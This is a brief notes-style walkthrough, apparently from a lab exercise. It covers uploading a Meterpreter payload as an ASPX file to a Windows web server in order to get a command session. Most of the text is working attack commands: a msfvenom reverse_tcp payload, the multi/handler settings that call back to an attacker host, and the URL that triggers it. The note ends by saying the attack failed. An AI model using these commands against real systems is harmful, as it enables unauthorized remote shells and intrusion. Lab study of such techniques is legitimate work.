since an asp file is present in the webserver if we upload a payload asp file and upload it we can get command session.


# generate meterpreter payload

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4433 -f aspx -o venom.aspx

# initiate multi/handler

use multi/handler

set RHOSTS 192.168.0.106

set LHOST 192.168.0.105

set LPORT 4433

set PAYLOAD windows/x64/meterpreter/reverse_tcp

run 

# run the payload

http://192.168.0.106/venom.aspx

# but doing this will only grant the system for a short period of time so the attack failed
